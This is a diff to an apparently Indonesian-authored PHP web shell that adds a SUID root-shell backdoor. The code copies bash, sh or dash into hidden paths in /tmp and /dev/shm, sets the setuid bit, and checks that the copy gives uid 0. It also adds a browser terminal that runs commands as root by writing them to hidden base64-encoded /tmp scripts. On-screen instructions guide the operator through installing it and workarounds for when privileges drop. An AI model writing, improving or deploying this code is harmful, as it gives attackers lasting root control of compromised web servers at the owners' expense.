@@ -2947,27 +2947,57 @@ function install_persistence_mechanisms() {
     $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root'];
     $suid_created = false;
     $suid_path = '';
+    $suid_source = '';
+    
+    // Try different shell sources (bash lebih mungkin work dengan -p flag)
+    $shell_sources = ['/bin/bash', '/bin/sh', '/bin/dash'];
     
     foreach ($suid_paths as $try_path) {
-        // Coba copy /bin/sh dan set SUID (hanya work kalau root)
-        $copy_result = execute_shell_command("cp /bin/sh $try_path 2>&1 && chmod 4755 $try_path 2>&1 && ls -la $try_path 2>&1");
-        
-        // Check apakah berhasil (harus owned by root dan ada SUID bit)
-        if (strpos($copy_result, 'root') !== false && 
-            (strpos($copy_result, 'rws') !== false || strpos($copy_result, 'rwxs') !== false)) {
-            $suid_created = true;
-            $suid_path = $try_path;
-            break;
+        foreach ($shell_sources as $shell) {
+            if (!file_exists($shell)) continue;
+            
+            // Coba copy shell dan set SUID (hanya work kalau root)
+            $copy_result = execute_shell_command("cp $shell $try_path 2>&1 && chmod 4755 $try_path 2>&1 && ls -la $try_path 2>&1");
+            
+            // Check apakah berhasil (harus owned by root dan ada SUID bit)
+            if (strpos($copy_result, 'root') !== false && 
+                (strpos($copy_result, 'rws') !== false || strpos($copy_result, 'rwxs') !== false)) {
+                $suid_created = true;
+                $suid_path = $try_path;
+                $suid_source = $shell;
+                break 2; // Break both loops
+            }
         }
     }
     
+    // Test SUID backdoor untuk confirm it works
+    $suid_test = '';
     if ($suid_created) {
+        $test_result = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
+        if (strpos($test_result, 'uid=0(root)') !== false) {
+            $suid_test = 'VERIFIED_WORKING';
+        } else {
+            $suid_test = 'TEST_FAILED: ' . substr($test_result, 0, 100);
+        }
+    }
+    
+    if ($suid_created && $suid_test === 'VERIFIED_WORKING') {
         $results['suid_backdoor'] = [
             'status' => 'installed',
             'path' => $suid_path,
+            'source' => $suid_source,
             'description' => 'SUID ROOT SHELL - Untuk Interactive Root Terminal',
-            'how_to_use' => "echo 'id' | base64 -d | $suid_path",
-            'note' => 'Jalankan command sebagai root dengan pipe ke SUID shell ini'
+            'how_to_use' => "Create script file, then: $suid_path -p < script.sh",
+            'note' => 'SUID backdoor tested and working! Use -p flag to preserve root privileges.'
+        ];
+    } elseif ($suid_created) {
+        $results['suid_backdoor'] = [
+            'status' => 'installed_unverified',
+            'path' => $suid_path,
+            'source' => $suid_source,
+            'description' => 'SUID ROOT SHELL - Created but test failed',
+            'how_to_use' => "$suid_path -p < script.sh",
+            'note' => 'SUID binary created but test failed: ' . $suid_test
         ];
     } else {
         $results['suid_backdoor'] = [
@@ -3347,7 +3377,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2338</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2349</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4065,8 +4095,11 @@ function list_dir($path) {
                     <input type="text" id="rootTerminalInput" placeholder="Enter command..." style="flex:1;background:#000;color:#0f0;border:1px solid #0f0;border-left:none;padding:6px;font-family:monospace;font-size:12px;outline:none;" onkeypress="if(event.key==='Enter')executeRootCommand()">
                     <button onclick="executeRootCommand()" style="background:#0f0;color:#000;border:none;padding:6px 15px;font-weight:bold;cursor:pointer;margin-left:5px;border-radius:0 3px 3px 0;">Execute</button>
                 </div>
-                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;display:flex;gap:10px;flex-wrap:wrap;align-items:center;justify-content:space-between;">
                     <span id="rootTerminalStatus" style="color:#f80;font-weight:bold;">⚠️ STEP 1: Click 🔒 Persist button above to install SUID backdoor</span>
+                    <label style="cursor:pointer;display:flex;align-items:center;gap:4px;">
+                        <input type="checkbox" id="directSuidMode" onchange="toggleDirectMode()"> Direct Mode (no -p flag)
+                    </label>
                 </div>
             </div>
         </div>
@@ -7153,7 +7186,8 @@ function showRootTerminal() {
 <span style="color:#ccc;">   1. Click 🔒 Persist button in the button row ABOVE ↑</span>
 <span style="color:#ccc;">   2. Wait for "SUID backdoor" to show INSTALLED</span>
 <span style="color:#ccc;">   3. This terminal will auto-detect the backdoor</span>
-<span style="color:#ccc;">   4. Then you can type commands as root!</span>
+<span style="color:#ccc;">   4. Check "Direct Mode" if normal mode doesn't work</span>
+<span style="color:#ccc;">   5. Then you can type commands as root!</span>
 
 <span style="color:#f80;">⏳ Waiting for SUID backdoor installation...</span>
 <span style="color:#f44;">⚠️  Closing this modal = losing root access!</span>`;
@@ -7256,16 +7290,38 @@ async function executeRootCommand() {
         
         if (suidBackdoorPath) {
             // Use SUID backdoor for stable root
-            // Note: SUID sh may not support -c, use alternative method
-            finalCmd = 'echo "' + btoa(cmd) + '" | base64 -d | ' + suidBackdoorPath;
+            // Method: Create a script file with the command, then execute with SUID shell
+            const scriptFile = '/tmp/.cmd_' + Date.now();
+            const cmdScript = '#!/bin/sh\n' + cmd + '\n';
             
-            console.log('[RootTerminal] Executing:', finalCmd);
+            // Step 1: Create script file with command
+            const createScriptCmd = 'echo "' + btoa(cmdScript) + '" | base64 -d > ' + scriptFile + ' && chmod 777 ' + scriptFile;
             
-            const formData = new FormData();
-            formData.append('cmd', finalCmd);
-            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            console.log('[RootTerminal] Step 1 - Creating script:', createScriptCmd);
             
-            const response = await fetch('', { method: 'POST', body: formData });
+            const formData1 = new FormData();
+            formData1.append('cmd', createScriptCmd);
+            formData1.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            await fetch('', { method: 'POST', body: formData1 });
+            
+            // Step 2: Execute script with SUID shell
+            // Try different methods based on Direct Mode checkbox
+            let execCmd;
+            if (useDirectMode) {
+                // Direct mode: pipe command directly to SUID shell (no -p flag)
+                execCmd = 'echo "' + btoa(cmd + '\n') + '" | base64 -d | ' + suidBackdoorPath + ' 2>&1';
+            } else {
+                // Privileged mode: use -p flag (may not work on all shells)
+                execCmd = suidBackdoorPath + ' -p < ' + scriptFile + ' 2>&1; rm -f ' + scriptFile;
+            }
+            
+            console.log('[RootTerminal] Step 2 - Executing with SUID (Direct Mode:', useDirectMode, '):', execCmd);
+            
+            const formData2 = new FormData();
+            formData2.append('cmd', execCmd);
+            formData2.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const response = await fetch('', { method: 'POST', body: formData2 });
             const html = await response.text();
             
             console.log('[RootTerminal] Response length:', html.length);
@@ -7282,10 +7338,26 @@ async function executeRootCommand() {
             if (outputEl) {
                 const result = outputEl.textContent.trim();
                 console.log('[RootTerminal] Output:', result.substring(0, 100));
-                if (result) {
-                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
+                
+                // Check if command actually ran as root
+                if (result.includes('www-data') || result.includes('uid=33')) {
+                    output.innerHTML += '<span style="color:#f44;font-weight:bold;">⚠️ Command ran as www-data, NOT root!</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">Why this happens:</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">Modern shells (bash/sh) drop SUID privileges</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">as a security measure when they detect</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">they are being run in certain ways.</span>\n\n';
+                    output.innerHTML += '<span style="color:#6cf;">💡 TRY THESE WORKAROUNDS:</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">Option 1: Enable "Direct Mode" checkbox</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">   Check the "Direct Mode" box below, then retry</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">Option 2: Manual SUID execution</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">   Go to regular Shell tab and run:</span>\n';
+                    output.innerHTML += '<span style="color:#0f0;">   echo "id" | ' + suidBackdoorPath + '</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">Option 3: Use regular shell exploit</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">   Close this modal and use the main shell</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">   with the SUID backdoor path above.</span>\n\n';
+                    output.innerHTML += '<span style="color:#888;">Raw output: ' + escapeHtml(result.substring(0, 200)) + '</span>\n';
                 } else {
-                    output.innerHTML += '<span style="color:#888;">[Command executed, no output]</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
                 }
             } else {
                 // Fallback: try to find pre#shellOutput
@@ -7337,16 +7409,17 @@ async function installQuickPersist() {
 
 // Get exploit wrapper command (fallback jika tidak ada SUID backdoor)
 async function getExploitWrapperCmd(cmd) {
-    // Cek apakah ada CVE yang sudah berhasil sebelumnya
-    // Untuk sekarang, gunakan metode sederhana
-    // Di production, ini bisa menggunakan CVE yang berhasil di auto-root
-    
-    // Metode 1: Coba pakai capabilities jika ada
-    const capabilitiesCmd = 'cd /tmp; echo "' + btoa(cmd) + '" | base64 -d | bash';
-    
     // Untuk sekarang return command biasa dengan warning
     // User perlu install persistence dulu untuk command yang stabil
     return cmd;
+}
+
+// Toggle Direct Mode untuk SUID execution
+let useDirectMode = false;
+function toggleDirectMode() {
+    const checkbox = document.getElementById('directSuidMode');
+    useDirectMode = checkbox ? checkbox.checked : false;
+    console.log('[RootTerminal] Direct Mode:', useDirectMode);
 }
 
 // Escape HTML helper
